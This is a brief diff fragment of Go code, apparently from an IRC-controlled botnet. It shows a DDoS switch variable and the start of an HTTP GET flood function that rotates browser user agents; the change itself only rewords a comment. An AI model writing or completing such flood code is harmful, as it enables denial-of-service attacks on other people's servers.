@@ -15,7 +15,7 @@ import (
 
 var DDoS_Switch bool
 
-//I miss understand about HTTP get flood. Will fix in v0.4
+//I miss understand about HTTP get flood concept. Will fix in v0.4
 func GET(getTarget, set_chan string, reportIRC net.Conn) {
 	agent_array := []string{
 		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
